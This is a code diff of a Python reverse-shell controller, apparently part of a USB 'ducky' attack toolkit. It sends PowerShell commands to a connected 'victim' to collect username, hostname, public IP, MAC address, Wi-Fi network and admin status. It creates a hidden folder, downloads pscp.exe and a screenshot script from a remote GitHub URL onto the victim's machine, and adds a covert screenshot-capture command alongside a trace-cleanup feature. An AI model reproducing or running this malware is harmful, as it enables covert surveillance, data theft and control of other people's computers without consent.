@@ -84,15 +84,15 @@ print("[+] Connected to victim (" + str(addr[0]) + ":" + str(addr[1]) + ")")
 print("[+] Reverse shell attack successful!")
 print("[+] Retrieved victim information:")
 conn.send("$env:USERNAME\n".encode())
-username = conn.recv(1024).decode().strip()
+username = conn.recv(1024).decode().split("\n")[0]
 print("Username:              " + username)
 conn.send("$env:COMPUTERNAME\n".encode())
-hostname = conn.recv(1024).decode().strip()
+hostname = conn.recv(1024).decode().split("\n")[0]
 print("Hostname:              " + hostname)
 ip = str(addr[0])
 print("IP Address:            " + ip)
 conn.send("(new-object net.webclient).downloadstring('http://ipecho.net/plain')".encode())
-public_ip = conn.recv(1024).decode().strip()
+public_ip = conn.recv(1024).decode().split("\n")[0]
 print("Public IP Address:     " + public_ip)
 victim_port = str(addr[1])
 print("Port:                  " + victim_port)
@@ -100,20 +100,24 @@ conn.send("getmac | findstr Device | foreach-object{$_.split(\" \")[0]}\n".encod
 mac = conn.recv(1024).decode().split("\n")[0]
 print("MAC Address:           " + mac)
 conn.send("netsh wlan show network | findstr SSID | foreach-object{$_.split(\" \")[3]}\n".encode())
-network = conn.recv(1024).decode().strip()
+network = conn.recv(1024).decode().split("\n")[0]
 print("Network:               " + network)
 conn.send("$pid\n".encode())
-pid = conn.recv(1024).decode().strip()
+pid = conn.recv(1024).decode().split("\n")[0]
 print("Powershell PID:        " + pid)
 conn.send("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")\n".encode())
-elevation = conn.recv(1024).decode().strip()
+elevation = conn.recv(1024).decode().split("\n")[0]
 print("Elevated Powershell:   " + elevation)
 conn.send("$env:OS\n".encode())
-operating_system = conn.recv(1024).decode()
-print("Operating System:      " + operating_system, end="")
-operating_system = operating_system.strip()
-conn.send("cd $env:userprofile/Documents; rm -r z; mkdir z; attrib +h z; cd z; df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"; cd $env:userprofile".encode())
+operating_system = conn.recv(1024).decode().split("\n")[0]
+print("Operating System:      " + operating_system)
+conn.send("cd $env:userprofile/Documents; rm -r z".encode())
+conn.send("mkdir z; attrib +h z; cd z".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/screenshot.ps1\" \"$env:userprofile/Documents/z/screenshot.ps1\"".encode())
+conn.send(". .\screenshot.ps1".encode())
 conn.recv(1024)
+conn.send("cd $env:userprofile".encode())
 threading.Thread(target=recv, args=(conn,)).start()
 last = ""
 while not stop:
@@ -141,6 +145,7 @@ while not stop:
             print("                     -u           Show username")
             print("                     -h           Show hostname")
             print("                     -ip          Show IP address")
+            print("                     -pip         Show public IP address")
             print("                     -port        Show port")
             print("                     -m           Show MAC address")
             print("                     -n           Show network name")
@@ -165,6 +170,7 @@ while not stop:
             print("ducky/simpsons       N/A          Prank the victim with Bart Simpson's lock message")
             print("ducky/cleanup        N/A          Cleanup footprint, leave no traces")
             print("ducky/size           N/A          Get size of current directory")
+            print("ducky/screenshot     N/A          Take a screenshot and save in reverse_shell directory")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -191,6 +197,8 @@ while not stop:
                 print("Hostname:               " + hostname)
             if "-ip" in options or "-a" in options:
                 print("IP Address:             " + ip)
+            if "-pip" in options or "-a" in options:
+                print("Public IP Address:      " + public_ip)
             if "-port" in options or "-a" in options:
                 print("Port:                   " + victim_port)
             if "-m" in options or "-a" in options:
@@ -297,6 +305,10 @@ while not stop:
         elif ducky_command[:4] == "size":
             commands = []
             commands.append("echo \"$([math]::round((get-childitem -recurse . | measure-object -property length -sum | findstr Sum).split(' ')[-1]/1000000))M\"")
+            stdin = "; ".join(commands)
+        elif ducky_command[:10] == "screenshot":
+            commands = []
+            commands.append("screenshot -screen -file \"$env:userprofile/Documents/z/image.png\" -imagetype png")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
